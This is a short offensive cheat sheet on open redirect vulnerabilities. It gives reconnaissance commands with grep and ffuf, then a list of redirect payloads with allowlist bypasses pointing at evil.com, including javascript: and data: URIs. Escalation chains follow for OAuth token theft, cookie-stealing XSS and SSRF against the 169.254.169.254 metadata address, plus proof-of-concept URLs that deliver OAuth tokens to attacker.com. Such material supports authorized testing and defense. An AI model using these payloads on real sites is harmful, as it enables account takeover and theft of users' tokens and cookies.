# Open Redirect

**CWE:** CWE-601 | **OWASP:** A01:2021

---

## Finding Open Redirects

```bash
# Common parameters
?redirect=, ?next=, ?url=, ?return=, ?returnTo=, ?dest=, ?go=,
?target=, ?redir=, ?destination=, ?continue=, ?to=, ?forward=

# Extract from Wayback / GAU
cat all_urls.txt | grep -iE "(redirect|next|url|return|dest|go|target|redir)=" | \
  awk -F= '{print $1"="}' | sort -u

# Test with ffuf
ffuf -u "https://target.com/redirect?url=FUZZ" \
  -w redirects.txt \
  -mc 301,302,303,307,308
```

---

## Payloads

```bash
# External redirect
https://evil.com
http://evil.com

# Protocol-relative
//evil.com
\/\/evil.com

# Slash confusion
/\evil.com
//evil.com/

# Target domain in URL (bypass allowlist)
https://evil.com/target.com
https://evil.com?target.com
https://evil.com#target.com
https://target.com.evil.com

# @ trick (browser resolves to domain after @)
https://target.com@evil.com

# URL encoding
https://%65%76%69%6C%2E%63%6F%6D   # evil.com encoded

# JavaScript protocol
javascript:alert(1)
javascript://evil.com

# Data URI
data:text/html,<script>window.location='https://evil.com'</script>
```

---

## Escalation Paths

```
Open Redirect alone = Low/Medium

Chain with OAuth:
  /oauth/authorize?...&redirect_uri=/redirect?next=https://evil.com
  → OAuth token/code delivered to attacker = Account Takeover = Critical

Chain with XSS:
  /redirect?url=javascript:alert(document.cookie)
  → XSS if javascript: protocol accepted

Chain with SSRF:
  /fetch?url=/redirect?next=http://169.254.169.254/
  → SSRF bypass via redirect
```

---

## PoC

```html
<!-- Basic Open Redirect PoC -->
<a href="https://target.com/redirect?url=https://evil.com">Click here</a>

<!-- OAuth Token Theft via Open Redirect PoC -->
https://target.com/oauth/authorize
  ?client_id=CLIENT_ID
  &response_type=token
  &redirect_uri=https://target.com/redirect%3Furl%3Dhttps://attacker.com
```
